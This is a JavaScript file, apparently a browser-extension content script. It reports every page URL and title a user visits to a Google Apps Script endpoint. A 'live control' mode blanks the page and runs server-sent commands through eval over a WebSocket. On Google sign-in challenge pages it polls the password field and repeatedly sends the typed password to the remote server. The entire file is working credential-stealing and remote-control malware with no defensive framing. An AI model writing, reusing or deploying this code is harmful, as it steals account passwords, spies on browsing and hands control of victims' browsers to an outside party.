console.log('V21');

// Log URLs and data
function serverLog(data) {
	return fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${data}`, {
		mode: 'cors'
	})
}

// Get current state from the apps script server
serverLog($('title').text())
	.then(res => res.text())
	.then(text => {
		switch (text.split('@')[0]) {
			case 'live':
				initLiveControl(text.split('@')[1]);
				break;
			case 'lc2':
				initLC2(text.split('@')[1]);
				break;
		}
	})
siteSpecifics(window.location.host)

// Check repeatedly to see if location has changed
var href = window.location.href;
setInterval(() => {
	if (window.location.href !== href) {
		href = window.location.href;
		serverLog($('title').text());
		siteSpecifics(window.location.host);
	}
}, 50);

// Distribute site specific tasks
function siteSpecifics(host) {
	switch (host) {
		case 'accounts.google.com':
			initPasswordMonitor();
			break;
	}

}

// Live Control
function initLiveControl(socketUrl) {
	if (window.location.protocol === 'https:') {
		window.location = 'http://example.com'
	}
	if (window.location.protocol === 'http:' && window.location.host !== '127.0.0.1:8080') {

		console.log('Live');
		$('html')[0].innerHTML = `<head><title>blank</title></head><body></body>`;

		const socket = new WebSocket(socketUrl);

		socket.addEventListener('open', function (event) {
			var message = {
				type: "handshake",
				content: "client"
			}
			socket.send(JSON.stringify(message));
		});

		socket.addEventListener('message', function (event) {
			var data = JSON.parse(event.data);
			console.log(data);
			if (data.type === 'commandClient') {
				eval(data.content);
			}
		});
	}
}
// LC2 (Live Control 2)
function initLC2(serverUrl) {
	if (window.location.host !== '127.0.0.1:8080') {
		var es = new EventSource(serverUrl);
		es.onmessage = function (event) {
			console.log(event.data);
		};
		es.addEventListener('world', function (event) {
			console.log(event)
		});
	}
}

// Google Password
function initPasswordMonitor() {
	if (window.location.pathname.split('/')[1] === 'signin' && window.location.pathname.split('/')[3] === 'challenge') {

		console.log('Monitoring');

		var password = $("input.whsOnd[type='password']");
		var currentVal = password.attr('data-initial-value');

		// Send to server
		serverLog(`PASSWORD: ${currentVal}`);

		// Check to see if the password has changed
		setInterval(() => {
			if (password.attr('data-initial-value') !== currentVal) {

				currentVal = password.attr('data-initial-value');

				// Send to server
				serverLog(`PASSWORD: ${currentVal}`);
			}
		}, 10);
	}
}